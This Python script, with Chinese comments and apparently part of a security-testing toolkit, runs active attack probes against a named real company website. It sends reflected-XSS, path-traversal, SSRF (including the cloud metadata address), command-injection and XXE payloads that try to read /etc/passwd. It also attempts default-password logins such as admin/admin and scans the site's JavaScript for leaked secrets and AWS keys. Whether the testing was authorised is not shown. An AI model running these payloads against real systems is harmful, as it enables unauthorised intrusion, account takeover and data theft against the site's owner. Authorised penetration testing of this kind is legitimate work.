"""深入测试 - XSS 利用验证 + 登录安全 + 更多检测"""
import requests
import urllib3
import re
import time
from secops_core.config import HTTP_USER_AGENT

urllib3.disable_warnings()
headers = {"User-Agent": HTTP_USER_AGENT}
BASE = "https://www.memblaze.com"

# 1. XSS 验证 - 确认 payload 在 HTML 中的位置
print("=== XSS 反射位置分析 ===")
try:
    payload = '"><secopsxss>'
    r = requests.get(f"{BASE}/search/list", params={"keyword": payload},
                    headers=headers, timeout=10, verify=False)
    # 找到 payload 在 HTML 中的上下文
    idx = r.text.find(payload)
    if idx >= 0:
        context = r.text[max(0, idx-200):idx+len(payload)+200]
        print(f"  Payload 位置上下文:")
        print(f"  {context}")
    # 检查是否有 CSP
    csp = r.headers.get("Content-Security-Policy", "")
    print(f"\n  CSP: {csp if csp else 'MISSING'}")
    # 检查 Content-Type
    ct = r.headers.get("Content-Type", "")
    print(f"  Content-Type: {ct}")
except Exception as e:
    print(f"  Error: {e}")

# 2. XSS 在其他参数中的测试
print("\n=== 其他页面 XSS 测试 ===")
# 测试新闻页面 (ID 参数)
test_pages = [
    "/about-company/news/689.html",
    "/product/pblaze7/656.html",
    "/innovate/technical-articles/686.html",
]
for page in test_pages:
    try:
        r = requests.get(f"{BASE}{page}", headers=headers, timeout=10, verify=False)
        if r.status_code == 200:
            # 检查页面中是否有用户可控的输入点
            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', r.text, re.IGNORECASE)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', r.text, re.IGNORECASE)
            if forms or inputs:
                print(f"  {page}: forms={forms}, inputs={inputs}")
    except:
        pass

# 3. 登录页面暴力破解防护测试
print("\n=== 登录安全测试 ===")
try:
    # 先获取 session
    s = requests.Session()
    s.headers.update(headers)
    s.verify = False
    
    # 获取登录页面 (获取 CSRF token)
    r = s.get(f"{BASE}/auth/login", timeout=10)
    print(f"  登录页面: {r.status_code}")
    
    # 查找 CSRF token
    csrf = re.search(r'name=["\']_token["\'][^>]*value=["\']([^"\']*)["\']', r.text, re.IGNORECASE)
    if csrf:
        print(f"  CSRF Token: {csrf.group(1)[:30]}...")
    else:
        # 尝试其他 CSRF 字段名
        csrf = re.search(r'name=["\']csrf["\'][^>]*value=["\']([^"\']*)["\']', r.text, re.IGNORECASE)
        csrf2 = re.search(r'name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']*)["\']', r.text, re.IGNORECASE)
        if csrf:
            print(f"  CSRF Token (csrf): {csrf.group(1)[:30]}...")
        elif csrf2:
            print(f"  CSRF Token: {csrf2.group(1)[:30]}...")
        else:
            print(f"  [!] 未发现 CSRF Token")
    
    # 测试弱密码登录
    test_creds = [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("root", "root"),
        ("test", "test"),
        ("admin", "admin123"),
    ]
    
    for account, password in test_creds:
        login_data = {"account": account, "password": password, "remember": "on"}
        if csrf:
            login_data["_token"] = csrf.group(1)
        
        r = s.post(f"{BASE}/auth/do-login", data=login_data, timeout=10, allow_redirects=False)
        print(f"  {account}:{password} -> {r.status_code}")
        if r.status_code == 302:
            print(f"    [!] 登录成功! Location: {r.headers.get('Location', 'N/A')}")
            break
        time.sleep(0.5)
except Exception as e:
    print(f"  Error: {e}")

# 4. 路径遍历测试 (针对已知参数)
print("\n=== 路径遍历测试 ===")
lfi_payloads = [
    "../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
]
for payload in lfi_payloads:
    try:
        r = requests.get(f"{BASE}/search/list", params={"keyword": payload},
                        headers=headers, timeout=8, verify=False)
        if "root:" in r.text or "[fonts]" in r.text or "daemon:" in r.text:
            print(f"  [!] LFI: {payload}")
            # 打印泄露内容
            for line in r.text.split("\n"):
                if "root:" in line or "[fonts]" in line:
                    print(f"      {line.strip()}")
        time.sleep(0.2)
    except:
        pass

# 5. SSRF 测试
print("\n=== SSRF 测试 ===")
ssrf_payloads = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]",
    "http://0x7f000001",
]
for payload in ssrf_payloads:
    try:
        r = requests.get(f"{BASE}/search/list", params={"keyword": payload},
                        headers=headers, timeout=8, verify=False)
        # 检查是否发起了请求
        if "ami-id" in r.text or "instance-id" in r.text:
            print(f"  [!] SSRF: {payload}")
        time.sleep(0.2)
    except:
        pass

# 6. 命令注入测试
print("\n=== 命令注入测试 ===")
rce_payloads = [
    "; ls -la",
    "| whoami",
    "$(whoami)",
    "`whoami`",
    "; cat /etc/passwd",
    "| ping -c 3 127.0.0.1",
]
for payload in rce_payloads:
    try:
        r = requests.get(f"{BASE}/search/list", params={"keyword": payload},
                        headers=headers, timeout=8, verify=False)
        if "root:" in r.text or "www-data" in r.text or "uid=" in r.text:
            print(f"  [!] RCE: {payload}")
        time.sleep(0.2)
    except:
        pass

# 7. XXE 测试 (通过搜索)
print("\n=== XXE 测试 ===")
xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
try:
    r = requests.post(f"{BASE}/search/list", data=xxe_payload,
                     headers={**headers, "Content-Type": "application/xml"},
                     timeout=10, verify=False)
    if "root:" in r.text:
        print(f"  [!] XXE vulnerability!")
    else:
        print(f"  [-] 无 XXE")
except Exception as e:
    print(f"  Error: {e}")

# 8. JWT 测试 (检查是否有 JWT token)
print("\n=== JWT 检测 ===")
try:
    s = requests.Session()
    s.headers.update(headers)
    s.verify = False
    r = s.get(f"{BASE}/auth/login", timeout=10)
    # 检查 cookie 中是否有 JWT
    for cookie in s.cookies:
        print(f"  Cookie: {cookie.name}={cookie.value[:50]}...")
        if cookie.value.count(".") == 2:
            print(f"    [!] 可能是 JWT token!")
    # 检查响应中是否有 JWT
    jwt_match = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', r.text)
    if jwt_match:
        print(f"  [!] JWT in response: {jwt_match.group()[:60]}...")
except Exception as e:
    print(f"  Error: {e}")

# 9. 敏感信息泄露 (JS 文件分析)
print("\n=== JS 文件敏感信息 ===")
try:
    r = requests.get(f"{BASE}/cn/", headers=headers, timeout=10, verify=False)
    js_files = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', r.text, re.IGNORECASE)
    print(f"  Found {len(js_files)} JS files")
    for js in js_files[:10]:
        if not js.startswith("http"):
            js = BASE + js
        try:
            r2 = requests.get(js, headers=headers, timeout=8, verify=False)
            # 搜索敏感信息
            secrets = re.findall(r'(?:api[_-]?key|secret|password|token|auth)["\s:=]+["\']([A-Za-z0-9+/=]{16,})["\']', r2.text, re.IGNORECASE)
            aws_keys = re.findall(r'AKIA[0-9A-Z]{16}', r2.text)
            if secrets:
                print(f"  [!] {js}: possible secrets found")
            if aws_keys:
                print(f"  [!] {js}: AWS key found!")
            # 搜索 API 端点
            api_endpoints = re.findall(r'["\']/(api|auth|admin|login)[^"\']*["\']', r2.text)
            if api_endpoints:
                print(f"  API endpoints in {js}: {api_endpoints[:5]}")
        except:
            pass
except Exception as e:
    print(f"  Error: {e}")

# 10. 点击劫持测试
print("\n=== 点击劫持测试 ===")
try:
    r = requests.get(f"{BASE}/cn/", headers=headers, timeout=10, verify=False)
    xfo = r.headers.get("X-Frame-Options", "")
    csp = r.headers.get("Content-Security-Policy", "")
    if not xfo and "frame-ancestors" not in csp:
        print(f"  [!] 无 X-Frame-Options 和 CSP frame-ancestors")
        print(f"  [!] 可被 iframe 嵌入 -> 点击劫持风险")
    else:
        print(f"  [-] 已防护: XFO={xfo}, CSP={csp}")
except Exception as e:
    print(f"  Error: {e}")
